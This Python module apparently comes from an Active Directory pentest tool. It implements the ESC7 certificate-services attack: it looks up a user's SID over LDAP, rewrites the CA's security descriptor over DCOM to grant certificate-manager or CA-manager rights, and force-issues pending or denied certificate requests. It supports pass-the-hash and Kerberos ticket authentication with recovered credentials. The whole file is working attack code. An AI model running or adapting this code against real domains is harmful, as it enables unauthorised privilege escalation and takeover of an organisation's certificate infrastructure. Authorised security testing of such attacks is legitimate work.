"""Native ICertAdminD/ICertAdminD2 DCOM operations for ESC7 (ManageCertificates/ManageCA).

All CA-administration reads/writes go through the native async aiosmb DCOM stack
(``SMBMachine.get_ca_security_dcom`` / ``set_ca_security_dcom`` /
``resubmit_cert_request_dcom``) and the security descriptor is parsed/edited with
``winacl`` — zero impacket dependency. The public ``add_officer`` / ``remove_officer`` /
``issue_pending_request`` functions stay synchronous (their call sites are a mix
of ``asyncio.to_thread`` and direct sync calls); they bridge to the async native
calls via ``run_async_sync``.
"""
from __future__ import annotations

from typing import Optional

from adscan_internal import telemetry
from adscan_internal.rich_output import (
    mark_sensitive,
    print_info,
    print_success,
)
from adscan_internal.services.async_bridge import run_async_sync
from adscan_core.rich_output import print_exception

# CA rights constants (matching [MS-WCCE] and certipy's constants)
CA_RIGHT_MANAGE_CA = 1
CA_RIGHT_MANAGE_CERTIFICATES = 2


def _build_ca_smb_config(
    *,
    ca_host: str,
    domain: str,
    username: str,
    password: Optional[str],
    nt_hash: Optional[str],
    ccache_path: Optional[str],
    dc_ip: Optional[str],
    posture_snapshot,
):
    """Build a posture-aware SMBConfig for the CA host (mirrors the collector).

    Kerberos is used only when a ``ccache_path`` is supplied (posture-aware via
    ``posture_snapshot``); otherwise NTLM / pass-the-hash with the recovered
    secret. ``SMBConfig.__post_init__`` normalises ``target_hostname`` to an FQDN
    (SPN helper) when Kerberos is requested; an IP is preserved as-is.
    """
    from adscan_internal.services.smb_transport import SMBConfig

    return SMBConfig(
        target_ip=ca_host,
        target_hostname=ca_host,
        domain=str(domain),
        auth_domain=str(domain),
        username=str(username),
        password=password or None,
        nt_hash=nt_hash,
        ccache_path=ccache_path,
        kdc_ip=str(dc_ip) if dc_ip else None,
        use_kerberos=bool(ccache_path),
        posture_snapshot=posture_snapshot,
    )


def _resolve_user_sid(
    dc_ip: str, domain: str, username: str, password: str, target_username: str
) -> Optional[bytes]:
    """Return the binary objectSid bytes for target_username (LDAP via badldap)."""
    from adscan_internal.services.ldap_transport_service import ADscanLDAPConfig, ADscanLDAPConnection
    cfg = ADscanLDAPConfig(domain=domain, dc_ip=dc_ip, use_ldaps=False,
                           use_kerberos=False, username=username, password=password)
    with ADscanLDAPConnection(cfg) as conn:
        conn.search(
            search_base=conn.domain_dn,
            search_filter=f"(sAMAccountName={target_username})",
            attributes=["objectSid"],
        )
        if not conn.entries:
            return None
        raw = conn.entries[0].entry_raw_attributes.get("objectSid") or []
        return raw[0] if raw and isinstance(raw[0], bytes) else None


def _apply_ca_right_to_sd(sd_bytes: bytes, user_sid, right: int, add: bool) -> tuple[Optional[bytes], bool]:
    """Pure winacl edit: add/remove ``right`` for ``user_sid`` in the CA SD.

    Returns ``(new_sd_bytes, changed)``. ``new_sd_bytes`` is ``None`` (and
    ``changed`` is ``False``) when the SD is already in the desired state and no
    write is needed. No network — deterministic, unit-testable.
    """
    from winacl.dtyp.ace import ACCESS_ALLOWED_ACE, ACEType, AceFlags
    from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR

    sd = SECURITY_DESCRIPTOR.from_bytes(sd_bytes)
    if sd.Dacl is None:
        # A CA's authoritative SD always carries a DACL; a missing one is a
        # parse/protocol anomaly, not a state we can meaningfully edit.
        raise ValueError("CA security descriptor has no DACL")
    aces = sd.Dacl.aces

    for i, ace in enumerate(aces):
        if not isinstance(ace, ACCESS_ALLOWED_ACE):
            continue
        if ace.Sid != user_sid:
            continue
        # Existing allow-ACE for this principal.
        if add:
            if ace.Mask & right:
                return None, False  # already has the right
            ace.Mask |= right
        else:
            if not (ace.Mask & right):
                return None, False  # right already absent
            ace.Mask ^= right
            if ace.Mask == 0:
                aces.pop(i)  # ACE now empty — drop it entirely
        return sd.to_bytes(), True

    # No matching ACE.
    if not add:
        return None, False  # remove on a right that isn't there — already absent
    new_ace = ACCESS_ALLOWED_ACE()
    new_ace.Sid = user_sid
    new_ace.Mask = right
    new_ace.AceFlags = AceFlags(0)
    new_ace.AceType = ACEType.ACCESS_ALLOWED_ACE_TYPE
    aces.append(new_ace)
    return sd.to_bytes(), True


def _modify_ca_right(
    *,
    ca_host: str,
    ca_name: str,
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    target_username: str,
    right: int,
    add: bool,
    nt_hash: Optional[str] = None,
    ccache_path: Optional[str] = None,
    posture_snapshot=None,
) -> tuple[bool, Optional[str]]:
    """Add or remove a CA right (ManageCA=1 or ManageCertificates=2) for target_username.

    Native aiosmb DCOM (GetCASecurity → winacl SD edit → SetCASecurity).
    Synchronous — call via ``asyncio.to_thread`` from async contexts or directly.
    """
    try:
        from winacl.dtyp.sid import SID

        sid_bytes = _resolve_user_sid(dc_ip, domain, username, password, target_username)
        if not sid_bytes:
            return False, f"User {target_username!r} not found in LDAP"
        user_sid = SID.from_bytes(sid_bytes)

        smb_config = _build_ca_smb_config(
            ca_host=ca_host, domain=domain, username=username, password=password,
            nt_hash=nt_hash, ccache_path=ccache_path, dc_ip=dc_ip,
            posture_snapshot=posture_snapshot,
        )

        async def _run() -> tuple[bool, int]:
            from adscan_internal.services.smb_transport import smb_machine_with_fallback

            async with smb_machine_with_fallback(smb_config) as machine:
                sd_bytes, err = await machine.get_ca_security_dcom(ca_name)
                if err is not None:
                    raise err
                if sd_bytes is None:
                    raise RuntimeError("GetCASecurity returned no security descriptor")

                new_sd_bytes, changed = _apply_ca_right_to_sd(sd_bytes, user_sid, right, add)
                if not changed:
                    return False, 0

                error_code, set_err = await machine.set_ca_security_dcom(ca_name, new_sd_bytes)
                if set_err is not None:
                    raise set_err
                return True, int(error_code)

        did_write, error_code = run_async_sync(_run())

        if not did_write:
            if add:
                print_info(
                    f"ESC7: {mark_sensitive(target_username, 'user')} already has "
                    f"right={right} on {ca_name!r}"
                )
            return True, None

        if error_code == 0:
            action = "added" if add else "removed"
            print_success(
                f"ESC7: right={right} {action} for "
                f"{mark_sensitive(target_username, 'user')} on {ca_name!r}"
            )
            return True, None
        return False, f"SetCASecurity returned ErrorCode={error_code}"

    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False, str(exc)


def add_officer(
    *, ca_host: str, ca_name: str, dc_ip: str, domain: str,
    username: str, password: str, target_username: str,
    nt_hash: Optional[str] = None, ccache_path: Optional[str] = None,
    posture_snapshot=None,
) -> tuple[bool, Optional[str]]:
    """Grant ManageCertificates (officer role) to target_username on ca_name."""
    return _modify_ca_right(
        ca_host=ca_host, ca_name=ca_name, dc_ip=dc_ip, domain=domain,
        username=username, password=password, target_username=target_username,
        right=CA_RIGHT_MANAGE_CERTIFICATES, add=True,
        nt_hash=nt_hash, ccache_path=ccache_path, posture_snapshot=posture_snapshot,
    )


def remove_officer(
    *, ca_host: str, ca_name: str, dc_ip: str, domain: str,
    username: str, password: str, target_username: str,
    nt_hash: Optional[str] = None, ccache_path: Optional[str] = None,
    posture_snapshot=None,
) -> tuple[bool, Optional[str]]:
    """Revoke ManageCertificates (officer role) from target_username on ca_name."""
    return _modify_ca_right(
        ca_host=ca_host, ca_name=ca_name, dc_ip=dc_ip, domain=domain,
        username=username, password=password, target_username=target_username,
        right=CA_RIGHT_MANAGE_CERTIFICATES, add=False,
        nt_hash=nt_hash, ccache_path=ccache_path, posture_snapshot=posture_snapshot,
    )


def issue_pending_request(
    *,
    ca_host: str,
    ca_name: str,
    request_id: int,
    username: str,
    password: str,
    domain: str,
    nt_hash: Optional[str] = None,
    dc_ip: Optional[str] = None,
    ccache_path: Optional[str] = None,
    posture_snapshot=None,
) -> tuple[bool, Optional[str]]:
    """Issue a pending/denied certificate request via ICertAdminD.ResubmitRequest.

    Requires ManageCertificates right. Native aiosmb DCOM. Synchronous — call via
    ``asyncio.to_thread`` from async contexts or directly.
    """
    try:
        smb_config = _build_ca_smb_config(
            ca_host=ca_host, domain=domain, username=username, password=password,
            nt_hash=nt_hash, ccache_path=ccache_path, dc_ip=dc_ip,
            posture_snapshot=posture_snapshot,
        )

        print_info(
            f"ESC7: issuing request ID {request_id} via ICertAdminD on "
            f"{mark_sensitive(ca_host, 'hostname')}..."
        )

        async def _run() -> int:
            from adscan_internal.services.smb_transport import smb_machine_with_fallback

            async with smb_machine_with_fallback(smb_config) as machine:
                disposition, err = await machine.resubmit_cert_request_dcom(ca_name, int(request_id))
                if err is not None:
                    raise err
                return int(disposition)

        disposition = run_async_sync(_run())

        # disposition 3 = CR_DISP_ISSUED (success)
        # disposition 0 = CR_DISP_INCOMPLETE (CA accepted, cert may be retrievable)
        if disposition in (3, 0):
            print_success(f"ESC7: request ID {request_id} issued (disposition={disposition}).")
            return True, None
        return False, f"ResubmitRequest returned disposition={disposition}"

    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return False, str(exc)
